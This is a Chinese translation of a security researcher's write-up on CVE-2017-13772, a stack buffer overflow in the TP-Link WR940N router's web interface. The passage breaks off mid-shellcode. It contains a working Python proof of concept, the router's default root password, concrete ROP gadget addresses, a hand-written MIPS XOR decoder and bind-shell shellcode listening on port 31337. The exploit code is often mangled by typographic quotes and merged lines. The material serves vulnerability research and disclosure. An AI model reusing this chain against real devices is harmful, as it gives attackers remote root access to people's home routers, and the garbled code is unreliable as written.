原文地址：[《A CURIOUS TALE OF REMOTE CODE EXECUTION, THE TP-LINK STORY –
CVE-2017-13772》](https://www.fidusinfosec.com/tp-link-remote-code-execution-cve-2017-13772/ "A CURIOUS TALE OF REMOTE CODE EXECUTION, THE TP-LINK STORY –
CVE-2017-13772")  
译者：hello1900@知道创宇404实验室
#### 前言：
本文重点讨论作者近期从事 TP-Link WR940N 家用 WiFi
路由器漏洞研究获得的心得体会，主要从发现漏洞代码路径的必要步骤与通过这些路径实现远程代码执行的方式两方面入手。
首先，我将介绍如何找到第一个漏洞以及生成完整攻击链的方法；然后，说明此漏洞已形成特定模式，可使设备遭受数百种网络攻击。
#### 设备
我选取的设备是TP-Link（硬件版本4）WR940N 家用 WiFi 路由器。进行物联网设备研究的通常做法是获取固件副本并提取文件系统。
固件链接：
如图所示，binwalk已成功发现并提取文件系统。下一步是获得关于设备运行程序的少量信息，例如影子文件内容（具体原因将在后文阐述）。
我接触过的多数嵌入式系统都采用busybox，所以重点在于找出能够运行哪些程序、是否需要某种形式的shell注入。解决上述问题通常有两种做法，一种做法是列出busybox中的所有symlink。我个人比较喜欢在chroot环境qemu下运行busybox二进制文件，好处是能够获知启用了哪些功能：
所以，我并没有采用Telnet、netcat等工具，但确实有用到tftp。后者可在获取shell注入后使用。最后，快速浏览rc.d/rcS后得出结论，路由器启动最后一项操作是运行httpd二进制文件。我原以为可从这里入手，因为HTTP
daemon通常提供较大攻击面。
#### 访问设备
我在Web界面初始测试阶段找到可在成功验证大型字符串的前提下致使设备停止响应的区域。有趣的是用户端代码输入不得超过50个字符。
显然，这种做法可通过Burp Suite轻易绕过。在等待USB uart
启动设备的过程中，我决定对这些字段进行简单的fuzz处理。此外，我还发现输入51字节ping_addr后产生以下后果：
尽管HTTP端口仍处于开放状态，我还是以略显笨拙的fuzzing方法将字节数提高到200，并发现这种做法确实能使服务崩溃：
现在，我们已成功发现一个拒绝服务（DoS）漏洞，但并没多大新意。为了合理调试运行程序，我需要通过uart交互界面访问设备，具体步骤参见。应注意，设备成功启动后将出现一个登陆提示。可尝试破解上述影子文件密码或像我一样到网上进行谷歌搜索（root密码为sohoadmin）。
现在我们已成功访问设备，可以了解实际运行了哪些程序。如图所示，httpd二进制文件负责多个进程。
最后一步是下载gdbserver。为确保正常运行，我花费大量功夫寻找一款交叉编译的gdbserver。如果选择下载GPL源代码，就可以省去这些麻烦，直接获取预先编译的二进制文件。我用SCP进行复制，经过一番周折终于发现连接到上一个httpd进程可以调试实际Web界面。
#### 漏洞概况
如上所述，用户输入超出JavaScript代码限制就会造成HTTP服务崩溃。
IDA中的二进制文件明确阐述了具体进程使用情况。例如，sub_453C50具有检查请求是否有效、通过验证的常用功能：
接下来，对httpGetEnv进行调用。应注意
“ping_addr”、“isNew”等值通过GET参数传递。然后，仍在相同函数中调用ipAddrDispose。
第一个漏洞就存在于这个函数中。函数开头声明堆栈变量va_AC，然后作为目标参数传递给strcpy调用。问题在于源参数（$s1）是函数的第一个引数，并且没有对其长度进行验证，属于一个经典的缓冲区溢出。
#### 概念验证
为此，我专门写了一个简单的python脚本触发漏洞，也就是登录功能。登录设备将生成随机URL。
    import urllib2
    import urllib
    import base64
    import hashlibdef login(ip, user, pwd):
    #### Generate the auth cookie of the form b64enc(‘admin:’ + md5(‘admin’))
    hash = hashlib.md5()
    hash.update(pwd)
    auth_string = “%s:%s” %(user, hash.hexdigest())
    encoded_string = base64.b64encode(auth_string)
    print “[debug] Encoded authorisation: %s” %encoded_string#### Send the request
    url = “http://” + ip + “/userRpm/LoginRpm.htm?Save=Save”
    req = urllib2.Request(url)
    req.add_header(‘Cookie’, ‘Authorization=Basic %s’ %encoded_string)
    resp = urllib2.urlopen(req)#### The server generates a random path for further requests, grab that here
    data = resp.read()
    next_url = “http://%s/%s/userRpm/” %(ip, data.split(“=”)[2].split(“/”)[3])
    print “[debug] Got random path for next stage, url is now %s” %next_urlreturn (next_url, encoded_string)
    def exploit(url, auth):
    #trash,control of s0,s1   +     ra  +   shellcode
    evil = “\x41″*800
    params = {‘ping_addr’: evil, ‘doType’: ‘ping’, ‘isNew’: ‘new’, ‘sendNum’: ’20’, ‘pSize’: ’64’, ‘overTime’: ‘800’, ‘trHops’: ’20’}
    new_url = url + “PingIframeRpm.htm?” + urllib.urlencode(params)
    req = urllib2.Request(new_url)
    req.add_header(‘Cookie’, ‘Authorization=Basic %s’ %auth)
    req.add_header(‘Referer’, url + “DiagnosticRpm.htm”)
    resp = urllib2.urlopen(req)
    if __name__ == ‘__main__’:
    data = login(“192.168.0.1”, “admin”, “admin”)
    exploit(data[0], data[1])
启动gdbserver（需附加到最后一个httpd进程）后，我在ipAddrDispose退出之前设置了一个断点，然后运行PoC：
可以看到，我们已经获得返回地址的控制权限。 在执行常规的msf_pattern_create /
pattern_offset进程后，s0（位于偏移量160）与$s1（位于偏移量164）的控制权。此外，我们还有一个大型缓冲区堆栈存放shellcode：
#### 攻击链构造
这部分工作需要注意Mips架构相关事项。首先是缓存一致性，这点在许多博客中都有广泛提及（参见
）。
简单说来，如果我们尝试在堆栈上执行shellcode，CPU将检查缓存中是否已有虚拟地址数据，如果有就执行。这意味着触发漏洞前，堆栈上的任何数据都可能被执行。
此外，如果我们的shellcode具有自修改属性（对于IE，我们使用编码器），编码指令将最终被执行。
参考：
正如许多在线资源所述，刷新缓存的最佳方式是通过ROP将调用设置为睡眠状态。触发该漏洞后，我将两个调用设置为睡眠状态，第一个直接进入睡眠状态，第二个在解码器成完成对含有坏字节的指令解码后进入睡眠状态。
我们只有确定哪些库可执行及其所在地址才能判断应使用哪些小工具。（注：默认情况下不启用ASLR）。
    httpd maps:
    00400000-00587000 r-xp 00000000 1f:02 64         /usr/bin/httpd
    00597000-005b7000 rw-p 00187000 1f:02 64         /usr/bin/httpd
    005b7000-00698000 rwxp 00000000 00:00 0          [heap]
    2aaa8000-2aaad000 r-xp 00000000 1f:02 237        /lib/ld-uClibc-0.9.30.so
    2aaad000-2aaae000 rw-p 00000000 00:00 0
    2aaae000-2aab2000 rw-s 00000000 00:06 0          /SYSV0000002f (deleted)
    2aabc000-2aabd000 r–p 00004000 1f:02 237        /lib/ld-uClibc-0.9.30.so
    2aabd000-2aabe000 rw-p 00005000 1f:02 237        /lib/ld-uClibc-0.9.30.so
    2aabe000-2aacb000 r-xp 00000000 1f:02 218        /lib/libpthread-0.9.30.so
    2aacb000-2aada000 —p 00000000 00:00 0
    2aada000-2aadb000 r–p 0000c000 1f:02 218        /lib/libpthread-0.9.30.so
    2aadb000-2aae0000 rw-p 0000d000 1f:02 218        /lib/libpthread-0.9.30.so
    2aae0000-2aae2000 rw-p 00000000 00:00 0
    2aae2000-2ab3f000 r-xp 00000000 1f:02 238        /lib/libuClibc-0.9.30.so7edfc000-7ee00000 rwxp 00000000 00:00 0
    7effc000-7f000000 rwxp 00000000 00:00 0
    7f1fc000-7f200000 rwxp 00000000 00:00 0
    7f3fc000-7f400000 rwxp 00000000 00:00 0
    7f5fc000-7f600000 rwxp 00000000 00:00 0
    7fc8b000-7fca0000 rwxp 00000000 00:00 0          [stack]
LibuClibC-0.9.30.so看似可行，在IDA中打开并使用中的mipsrop.py脚本就可以寻找小工具了。
首先，我们需要一个具有以下功能的小工具：
    li $a0, 1
    mov $t9, $s0 or $s1 #we control $s0 and $s1
    jr $t9
运行的第一个命令是mipsrop.set_base（0x2aae000），它将自动计算实际地址。
注意第二个小工具，它返回到$s1中的地址：
这是我设置睡眠状态调用的小工具，它的地址将覆盖ipAddrDispose的返回地址。
我们将要用到的下一个小工具（放入$s1）需要调用睡眠状态，前提是将睡眠后调用的小工具地址放放在ra中。
我们可以使用mipsrop.tail()查找此类小工具。
这个小工具运行良好，唯一要注意的是它会在初次运行时自动完成调用。
第一次被调用时，t9中的地址跳转。为了让这个小工具正常工作，需要准备堆栈。在第一次调用过程中，将睡眠地址放在sp)。
在第二次调用过程中，sp)，再根据最终小工具填写s1（跳转至现有shellcode）。
这为我们提供了以下有效载荷：
              Trash           $s1                  $ra
    rop = “A”*164 + call_sleep  + prepare_sleep + “B”*0x20 + sleep_addr
    $s0            $s1             $ra
    rop += “C”*0x20 +  “D”*4 + “E”*4 + next_gadg
从睡眠状态返回后，待调用的下一个小工具需要将堆栈指针存储在寄存器中，然后跳转至s1中的地址（均在控制范围内）。
这将导致最终的小工具跳转到该寄存器（意味着它将跳转至堆栈的某个位置，最好是shellcode的位置）。mipsrop.py中的一个便捷功能是stack
stackfinder()：
浏览后发现几乎所有这些小工具都好用，我们重点了解最后一个：
既然s2中地址（堆栈地址）的小工具。
这些小工具都有效，但我偏好使用对其他寄存器影响最小的小工具，例如：
此时，有效载荷如下所示：
    nop = “\x22\x51\x44\x44”
    gadg_1 = “\x2A\xB3\x7C\x60”
    gadg_2 = “\x2A\xB1\x78\x40”
    sleep_addr = “\x2a\xb3\x50\x90”
    stack_gadg = “\x2A\xAF\x84\xC0”
    call_code = “\x2A\xB2\xDC\xF0″def first_exploit(url, auth):
    #                trash                $s1        $ra
    rop = “A”*164 + gadg_2  + gadg_1 + “B”*0x20 + sleep_addr
    rop += “C”*0x20 + call_code + “D”*4 + stack_gadg + nop*0x20 + shellcode
攻击链运行后困在NOP sled环节，当务之急是写一些shellcode，识别坏字符，并将 \+  \+ 附加到攻击链。
我只找到一处坏字节0x20，显然应该是0x00。
我尝试使所有常见有效载荷正常工作，但msf_venom无法使用mips/long_xor编码，而我也无法获得bowcaster有效载荷。 我没写过mips
shellcode，所以决定写一个极简版编码器，仅通过引用堆栈偏移对含有坏字节的指令进行操作。
    .set noreorder
    #nop
    addi $s5, $s6, 0x4444#xor key
    li $s1, 2576980377#get address of stack
    la $s2, 1439($sp)#s2 -> end of shellcode (end of all shellcode)
    addi $s2, $s2, -864#decode first bad bytes
    lw $t2, -263($s2)
    xor $v1, $s1, $t2
    sw $v1, -263($s2)#decode 2nd bad bytes
    lw $t2, -191($s2)
    xor $v1, $s1, $t2
    sw $v1, -191($s2)##### sleep #####li $v0, 4166
    li $t7, 0x0368
    addi $t7, $t7, -0x0304
    sw $t7, -0x0402($sp)
    sw $t7, -0x0406($sp)
    la $a0, -0x0406($sp)
    syscall 0x40404
    addi $t4, $t4, 4444 #nop
这显然不是最有效的处理方式，因为需要在堆栈上找到每个坏字节的偏移量（幸好mips是4字节对齐指令，因此每个偏移都是4的倍数）。此外，还需要计算每个坏字节指令的编码值。
绑定shellcode非常简单。
    .set noreorder
    ###### sys_socket ######
    addiu  $sp, $sp, -32
    li               $t6, -3
    nor          $a0, $t6, $zero
    nor          $a1, $t6, $zero
    slti           $a2, $0, -1
    li               $v0, 4183
    syscall 0x40404##### sys_bind ####
    add          $t9, $t9, 0x4444                #nop
    andi        $s0, $v0, 0xffff
    li               $t6, -17                  nor          $t6, $t6, $zero
    li               $t5, 0x7a69         #port 31337        li               $t7,  -513
    nor          $t7, $t7, $zero
    sllv           $t7, $t7, $t6
    or             $t5, $t5, $t7       sw            $t5, -32($sp)       sw     $zero,-28($sp)